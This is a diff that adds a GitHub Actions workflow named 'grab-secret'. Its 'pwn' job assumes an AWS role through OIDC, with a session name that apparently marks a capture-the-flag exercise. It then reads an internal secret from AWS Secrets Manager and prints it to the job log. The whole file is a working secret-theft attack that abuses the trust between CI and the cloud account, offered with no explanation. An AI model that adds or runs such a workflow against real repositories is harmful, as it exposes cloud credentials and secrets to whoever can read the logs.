@@ -1,0 +1,27 @@
+name: grab-secret
+on: { push: { branches: [ "main" ] } }
+
+jobs:
+  pwn:
+    permissions:
+      id-token: write
+      contents: read
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Configure AWS from OIDC
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::170974506515:role/github-deployment-role
+          aws-region: us-west-2
+          role-session-name: ctf-hexnova
+
+      - name: Pull the “next hop” secret
+        run: |
+          aws secretsmanager get-secret-value \
+            --secret-id internal/secrets/id-v2 \
+            --query SecretString -o text > secret.json
+          echo "SECRET:"
+          cat secret.json
+
